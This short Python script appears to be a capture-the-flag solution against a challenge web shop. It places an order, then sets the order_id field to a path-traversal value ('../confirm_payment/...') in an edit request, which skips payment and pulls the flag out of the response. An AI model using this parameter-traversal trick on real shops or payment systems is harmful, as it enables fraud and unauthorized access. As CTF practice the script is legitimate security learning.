import requests


target = "http://localhost:8000/"
target = "https://matcha-shop-aycep-c5aa4b56.chal.zip/"

base_order = {
    "item_name": "Matcha Strawberry",
    "sweetness": "50%",
    "milk_type":"Whole Milk",
    "ice_level": "Normal Ice"
}

response = requests.post(f"{target}/submit_order", data=base_order)

order_id = response.text.split('<input type="hidden" name="order_id" value="')[1].split('"')[0]
print(f"{order_id=}")

res = requests.post(f"{target}/edit", data={
    "order_id": f"../confirm_payment/{order_id}",
    "save": "1"
} | base_order)


text = res.text

assert "Flag" in text
flag = res.text.split("Flag: ")[1].split("<")[0]
print(f"{flag=}")